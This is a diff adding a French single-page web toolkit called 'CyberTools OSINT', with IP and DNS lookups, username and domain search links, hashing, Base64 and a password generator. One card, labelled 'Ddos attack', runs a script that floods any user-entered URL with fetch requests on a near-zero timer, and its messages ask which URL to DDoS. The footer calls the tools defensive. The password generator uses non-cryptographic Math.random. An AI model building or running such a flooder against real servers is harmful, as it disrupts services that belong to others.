@@ -1,0 +1,1009 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>CyberTools OSINT</title>
+
+<style>* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background: #070b10;
+    color: #e9eef5;
+    font-family: Arial, sans-serif;
+    min-height: 100vh;
+}
+
+header {
+    padding: 30px 20px;
+    text-align: center;
+    background: #0c121a;
+    border-bottom: 1px solid #202b38;
+}
+
+header h1 {
+    color: #00ff9d;
+    font-size: 32px;
+    text-shadow: 0 0 15px rgba(0, 255, 157, 0.35);
+}
+
+header p {
+    margin-top: 8px;
+    color: #8995a5;
+}
+
+.container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 25px;
+}
+
+.search {
+    display: flex;
+    margin-bottom: 30px;
+}
+
+.search input {
+    width: 100%;
+    padding: 15px;
+    border: 1px solid #273443;
+    border-radius: 10px;
+    background: #101720;
+    color: white;
+    outline: none;
+    transition: 0.2s;
+}
+
+.search input:focus {
+    border-color: #00ff9d;
+    box-shadow: 0 0 12px rgba(0, 255, 157, 0.15);
+}
+
+.category {
+    margin-bottom: 35px;
+}
+
+.category h2 {
+    color: #00ff9d;
+    margin-bottom: 15px;
+    border-left: 3px solid #00ff9d;
+    padding-left: 10px;
+}
+
+.grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 15px;
+}
+
+.card {
+    background: #101720;
+    border: 1px solid #202c3b;
+    border-radius: 14px;
+    padding: 20px;
+    transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
+}
+
+.card:hover {
+    transform: translateY(-3px);
+    border-color: #00ff9d;
+    box-shadow: 0 8px 25px rgba(0, 255, 157, 0.08);
+}
+
+.card h3 {
+    margin-bottom: 8px;
+    color: #e9eef5;
+}
+
+.card p {
+    color: #8995a5;
+    font-size: 14px;
+    margin-bottom: 15px;
+    line-height: 1.5;
+}
+
+input,
+textarea {
+    width: 100%;
+    padding: 11px;
+    margin-bottom: 9px;
+    border: 1px solid #293647;
+    border-radius: 8px;
+    background: #080d13;
+    color: white;
+    outline: none;
+    font-family: Arial, sans-serif;
+}
+
+input:focus,
+textarea:focus {
+    border-color: #00ff9d;
+    box-shadow: 0 0 8px rgba(0, 255, 157, 0.1);
+}
+
+textarea {
+    min-height: 100px;
+    resize: vertical;
+}
+
+button {
+    padding: 11px 15px;
+    margin: 3px;
+    border: none;
+    border-radius: 8px;
+    background: #00ff9d;
+    color: #00150d;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.2s;
+}
+
+button:hover {
+    filter: brightness(1.15);
+    transform: translateY(-1px);
+}
+
+.stop {
+    background: #ff5c5c;
+    color: white;
+}
+
+.result {
+    margin-top: 10px;
+    padding: 11px;
+    min-height: 40px;
+    border-radius: 8px;
+    background: #080d13;
+    border: 1px solid #17212c;
+    color: #00ff9d;
+    white-space: pre-wrap;
+    word-break: break-word;
+    line-height: 1.5;
+}
+
+footer {
+    text-align: center;
+    padding: 30px;
+    color: #647080;
+    border-top: 1px solid #202b38;
+    margin-top: 20px;
+}
+
+.hidden {
+    display: none;
+}
+
+@media (max-width: 600px) {
+    header h1 {
+        font-size: 25px;
+    }
+
+    .container {
+        padding: 15px;
+    }
+
+    .grid {
+        grid-template-columns: 1fr;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <h1>🟢 CyberTools OSINT</h1>
+    <p>OSINT • Network • Web • Crypto • Utilities</p>
+</header>
+
+<div class="container">
+
+<!-- RECHERCHE -->
+
+<div class="search">
+    <input
+        id="search"
+        placeholder="🔎 Rechercher un outil..."
+        oninput="searchTools()"
+    >
+</div>
+
+
+<!-- IP / NETWORK -->
+
+<section class="category">
+
+<h2>🌐 IP & NETWORK</h2>
+
+<div class="grid">
+
+    <div class="card tool-card">
+        <h3>🌍 Mon IP</h3>
+
+        <p>
+            Affiche ton IP publique.
+        </p>
+
+        <button onclick="getMyIP()">
+            Vérifier
+        </button>
+
+        <div id="myIP" class="result"></div>
+    </div>
+
+
+    <div class="card tool-card">
+
+        <h3>📍 IP Geolocation</h3>
+
+        <p>
+            Informations géographiques
+            approximatives d'une IP.
+        </p>
+
+        <input
+            id="ipInput"
+            placeholder="8.8.8.8"
+        >
+
+        <button onclick="locateIP()">
+            Localiser
+        </button>
+
+        <div id="ipResult" class="result"></div>
+
+    </div>
+
+
+    <div class="card tool-card">
+
+        <h3>🔎 DNS Lookup</h3>
+
+        <p>
+            Recherche DNS publique.
+        </p>
+
+        <input
+            id="dnsInput"
+            placeholder="example.com"
+        >
+
+        <button onclick="dnsLookup()">
+            Rechercher
+        </button>
+
+    </div>
+
+
+    <div class="card tool-card">
+
+        <h3>📋 WHOIS</h3>
+
+        <p>
+            Informations publiques d'un domaine.
+        </p>
+
+        <input
+            id="whoisInput"
+            placeholder="example.com"
+        >
+
+        <button onclick="whoisLookup()">
+            WHOIS
+        </button>
+
+    </div>
+
+</div>
+</section>
+
+
+<!-- OSINT -->
+
+<section class="category">
+
+<h2>🕵️ OSINT</h2>
+
+<div class="grid">
+
+    <div class="card tool-card">
+
+        <h3>🌐 Recherche domaine</h3>
+
+        <p>
+            Recherche publique sur un domaine.
+        </p>
+
+        <input
+            id="domainInput"
+            placeholder="example.com"
+        >
+
+        <button onclick="domainSearch()">
+            Rechercher
+        </button>
+
+    </div>
+
+
+    <div class="card tool-card">
+
+        <h3>👤 Username Search</h3>
+
+        <p>
+            Recherche publique d'un pseudo.
+        </p>
+
+        <input
+            id="username"
+            placeholder="pseudo"
+        >
+
+        <button onclick="usernameSearch()">
+            Rechercher
+        </button>
+
+    </div>
+
+
+    <div class="card tool-card">
+
+        <h3>🔗 URL Analyzer</h3>
+
+        <p>
+            Analyse les composants d'une URL.
+        </p>
+
+        <input
+            id="urlInput"
+            placeholder="https://example.com/test"
+        >
+
+        <button onclick="analyzeURL()">
+            Analyser
+        </button>
+
+        <div id="urlResult" class="result"></div>
+
+    </div>
+
+</div>
+</section>
+
+
+<!-- CRYPTO -->
+
+<section class="category">
+
+<h2>🔐 CRYPTO & ENCODING</h2>
+
+<div class="grid">
+
+    <div class="card tool-card">
+
+        <h3>🔢 SHA-256</h3>
+
+        <p>
+            Calcule le SHA-256 d'un texte.
+        </p>
+
+        <textarea
+            id="hashInput"
+            placeholder="Texte..."
+        ></textarea>
+
+        <button onclick="sha256()">
+            Hash
+        </button>
+
+        <div id="hashResult" class="result"></div>
+
+    </div>
+
+
+    <div class="card tool-card">
+
+        <h3>🔤 Base64</h3>
+
+        <p>
+            Encode ou décode du Base64.
+        </p>
+
+        <textarea
+            id="base64Input"
+            placeholder="Texte..."
+        ></textarea>
+
+        <button onclick="encode64()">
+            Encoder
+        </button>
+
+        <button onclick="decode64()">
+            Décoder
+        </button>
+
+        <div id="base64Result" class="result"></div>
+
+    </div>
+
+</div>
+</section>
+
+
+<!-- UTILITAIRES -->
+
+<section class="category">
+
+<h2>🛠️ UTILITAIRES</h2>
+
+<div class="grid">
+
+    <div class="card tool-card">
+
+        <h3>🔑 Password Generator</h3>
+
+        <p>
+            Génère un mot de passe aléatoire.
+        </p>
+
+        <button onclick="generatePassword()">
+            Générer
+        </button>
+
+        <div
+            id="passwordResult"
+            class="result"
+        ></div>
+
+    </div>
+
+
+    <div class="card tool-card">
+
+        <h3>🧑‍💻 User-Agent</h3>
+
+        <p>
+            Affiche le User-Agent du navigateur.
+        </p>
+
+        <button onclick="showUA()">
+            Afficher
+        </button>
+
+        <div
+            id="uaResult"
+            class="result"
+        ></div>
+
+    </div>
+
+
+    <!-- LOAD TEST -->
+
+    <div class="card tool-card">
+
+        <h3>Ddos attack</h3>
+
+        <p>
+            l'url du serveur :
+            1000 requête par seconde.
+        </p>
+
+        <input
+            id="loadUrl"
+            placeholder="https://ton-serveur.test"
+        >
+
+        <button onclick="startLoadTest()">
+            ▶️ Démarrer
+        </button>
+
+        <button
+            class="stop"
+            onclick="stopLoadTest()"
+        >
+            ⏹️ Arrêter
+        </button>
+
+        <div
+            id="loadResult"
+            class="result"
+        >
+            Test arrêté.
+        </div>
+
+    </div>
+
+</div>
+</section>
+
+</div>
+
+
+<footer>
+    CyberTools OSINT — outils publics et défensifs
+</footer>
+
+
+<script>
+
+/* =========================
+   RECHERCHE
+========================= */
+
+function searchTools() {
+
+    const query =
+        document
+        .getElementById("search")
+        .value
+        .toLowerCase();
+
+    document
+        .querySelectorAll(".tool-card")
+        .forEach(card => {
+
+            const text =
+                card.innerText.toLowerCase();
+
+            card.style.display =
+                text.includes(query)
+                ? ""
+                : "none";
+        });
+}
+
+
+/* =========================
+   IP PUBLIQUE
+========================= */
+
+async function getMyIP() {
+
+    const result =
+        document.getElementById("myIP");
+
+    result.textContent =
+        "Chargement...";
+
+    try {
+
+        const response =
+            await fetch(
+                "https://api.ipify.org?format=json"
+            );
+
+        const data =
+            await response.json();
+
+        result.textContent =
+            "IP publique : " + data.ip;
+
+    } catch {
+
+        result.textContent =
+            "Impossible de récupérer l'IP.";
+
+    }
+}
+
+
+/* =========================
+   GEOLOCATION IP
+========================= */
+
+async function locateIP() {
+
+    const ip =
+        document
+        .getElementById("ipInput")
+        .value
+        .trim();
+
+    const result =
+        document.getElementById("ipResult");
+
+    if (!ip) {
+
+        result.textContent =
+            "Entre une IP.";
+
+        return;
+    }
+
+    result.textContent =
+        "Recherche...";
+
+    try {
+
+        const response =
+            await fetch(
+                "https://ipapi.co/" +
+                encodeURIComponent(ip) +
+                "/json/"
+            );
+
+        const data =
+            await response.json();
+
+        result.textContent =
+`IP : ${data.ip || "?"}
+Pays : ${data.country_name || "?"}
+Région : ${data.region || "?"}
+Ville : ${data.city || "?"}
+Organisation : ${data.org || "?"}
+ASN : ${data.asn || "?"}`;
+
+    } catch {
+
+        result.textContent =
+            "Erreur de recherche.";
+
+    }
+}
+
+
+/* =========================
+   DNS
+========================= */
+
+function dnsLookup() {
+
+    const domain =
+        document
+        .getElementById("dnsInput")
+        .value
+        .trim();
+
+    if (!domain) return;
+
+    window.open(
+        "https://dns.google/resolve?name=" +
+        encodeURIComponent(domain),
+        "_blank"
+    );
+}
+
+
+/* =========================
+   WHOIS
+========================= */
+
+function whoisLookup() {
+
+    const domain =
+        document
+        .getElementById("whoisInput")
+        .value
+        .trim();
+
+    if (!domain) return;
+
+    window.open(
+        "https://who.is/whois/" +
+        encodeURIComponent(domain),
+        "_blank"
+    );
+}
+
+
+/* =========================
+   DOMAIN SEARCH
+========================= */
+
+function domainSearch() {
+
+    const domain =
+        document
+        .getElementById("domainInput")
+        .value
+        .trim();
+
+    if (!domain) return;
+
+    window.open(
+        "https://www.google.com/search?q=" +
+        encodeURIComponent(
+            '"' + domain + '"'
+        ),
+        "_blank"
+    );
+}
+
+
+/* =========================
+   USERNAME SEARCH
+========================= */
+
+function usernameSearch() {
+
+    const username =
+        document
+        .getElementById("username")
+        .value
+        .trim();
+
+    if (!username) return;
+
+    window.open(
+        "https://www.google.com/search?q=" +
+        encodeURIComponent(
+            '"' + username + '"'
+        ),
+        "_blank"
+    );
+}
+
+
+/* =========================
+   URL ANALYZER
+========================= */
+
+function analyzeURL() {
+
+    const input =
+        document
+        .getElementById("urlInput")
+        .value
+        .trim();
+
+    const result =
+        document.getElementById("urlResult");
+
+    try {
+
+        const url =
+            new URL(input);
+
+        result.textContent =
+`Protocol : ${url.protocol}
+Hostname : ${url.hostname}
+Port : ${url.port || "default"}
+Path : ${url.pathname}
+Query : ${url.search || "aucune"}
+Hash : ${url.hash || "aucun"}`;
+
+    } catch {
+
+        result.textContent =
+            "URL invalide.";
+
+    }
+}
+
+
+/* =========================
+   SHA-256
+========================= */
+
+async function sha256() {
+
+    const text =
+        document
+        .getElementById("hashInput")
+        .value;
+
+    const buffer =
+        new TextEncoder()
+        .encode(text);
+
+    const hash =
+        await crypto.subtle.digest(
+            "SHA-256",
+            buffer
+        );
+
+    const result =
+        Array.from(
+            new Uint8Array(hash)
+        )
+        .map(
+            byte =>
+                byte
+                .toString(16)
+                .padStart(2, "0")
+        )
+        .join("");
+
+    document
+        .getElementById("hashResult")
+        .textContent = result;
+}
+
+
+/* =========================
+   BASE64
+========================= */
+
+function encode64() {
+
+    const text =
+        document
+        .getElementById("base64Input")
+        .value;
+
+    document
+        .getElementById("base64Result")
+        .textContent =
+            btoa(
+                unescape(
+                    encodeURIComponent(text)
+                )
+            );
+}
+
+
+function decode64() {
+
+    const text =
+        document
+        .getElementById("base64Input")
+        .value;
+
+    try {
+
+        document
+            .getElementById("base64Result")
+            .textContent =
+                decodeURIComponent(
+                    escape(
+                        atob(text)
+                    )
+                );
+
+    } catch {
+
+        document
+            .getElementById("base64Result")
+            .textContent =
+                "Base64 invalide.";
+
+    }
+}
+
+
+/* =========================
+   PASSWORD
+========================= */
+
+function generatePassword() {
+
+    const chars =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
+        "abcdefghijklmnopqrstuvwxyz" +
+        "0123456789!@#$%^&*()_+";
+
+    let password = "";
+
+    for (let i = 0; i < 20; i++) {
+
+        password +=
+            chars[
+                Math.floor(
+                    Math.random() *
+                    chars.length
+                )
+            ];
+    }
+
+    document
+        .getElementById("passwordResult")
+        .textContent = password;
+}
+
+
+/* =========================
+   USER AGENT
+========================= */
+
+function showUA() {
+
+    document
+        .getElementById("uaResult")
+        .textContent =
+            navigator.userAgent;
+}
+
+
+/* =========================
+   LOAD TEST
+========================= */
+
+let loadTimer = null;
+let requestCount = 0;
+
+function startLoadTest() {
+
+    const url =
+        document
+        .getElementById("loadUrl")
+        .value
+        .trim();
+
+    const result =
+        document
+        .getElementById("loadResult");
+
+    if (!url) {
+
+        result.textContent =
+            "Entre l'URL que tu veut ddos.";
+
+        return;
+    }
+
+    if (loadTimer !== null) {
+
+        result.textContent =
+            "Le ddos est déjà en cours.";
+
+        return;
+    }
+
+    requestCount = 0;
+
+    result.textContent =
+        "ddos demarre...";
+
+    loadTimer =
+        setInterval(async () => {
+
+            try {
+
+                const response =
+                    await fetch(url, {
+                        method: "GET",
+                        cache: "no-store"
+                    });
+
+                requestCount++;
+
+                result.textContent =
+`ddos en cours...
+Requêtes envoyées : ${requestCount}
+Dernier statut HTTP : ${response.status}`;
+
+            } catch (error) {
+
+                requestCount++;
+
+                result.textContent =
+`ddos en cours...
+Requêtes envoyées : ${requestCount}
+Erreur : ${error.message}`;
+
+            }
+
+        }, 0.0001);
+}
+
+
+function stopLoadTest() {
+
+    if (loadTimer !== null) {
+
+        clearInterval(loadTimer);
+
+        loadTimer = null;
+    }
+
+    document
+        .getElementById("loadResult")
+        .textContent =
+`Ddos arrete.
+Requêtes envoyées : ${requestCount}`;
+}
+
+</script>
+
+</body>
+</html>
